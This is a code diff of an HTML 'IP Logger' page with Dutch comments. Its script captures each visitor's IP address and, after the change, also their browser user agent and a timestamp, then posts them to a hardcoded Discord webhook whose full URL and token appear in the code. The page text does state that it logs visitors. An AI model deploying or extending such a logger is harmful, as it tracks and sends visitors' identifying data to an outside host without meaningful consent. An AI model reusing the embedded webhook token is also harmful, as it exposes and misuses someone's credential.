@@ -5,14 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
     <script>
-        // Functie om IP-adres te verkrijgen
+        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
         function getIP(json) {
             var ipAddress = json.ip;
-            sendToDiscord(ipAddress);
+            var userAgent = navigator.userAgent;
+            var timestamp = new Date().toISOString();
+            sendToDiscord(ipAddress, userAgent, timestamp);
         }
 
-        // Functie om IP-adres naar Discord webhook te sturen
-        function sendToDiscord(ipAddress) {
+        // Functie om IP-adres, gebruikersagent en tijdstip naar Discord webhook te sturen
+        function sendToDiscord(ipAddress, userAgent, timestamp) {
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
             // Maak een nieuw XMLHttpRequest object aan
@@ -24,8 +26,10 @@
             // Stel de content type header in
             xhr.setRequestHeader("Content-Type", "application/json");
 
-            // Stel de payload in met het IP-adres
-            var payload = JSON.stringify({ content: "IP Address: " + ipAddress });
+            // Stel de payload in met IP-adres, gebruikersagent en tijdstip
+            var payload = JSON.stringify({
+                content: "IP Address: " + ipAddress + "\nUser Agent: " + userAgent + "\nTimestamp: " + timestamp
+            });
             
             // Stuur het verzoek
             xhr.send(payload);
@@ -41,6 +45,6 @@
 </head>
 <body>
     <h1>IP Logger</h1>
-    <p>Deze pagina logt uw IP-adres en stuurt het naar Discord.</p>
+    <p>Deze pagina logt uw IP-adres, gebruikersagent en tijdstip en stuurt het naar Discord.</p>
 </body>
 </html>
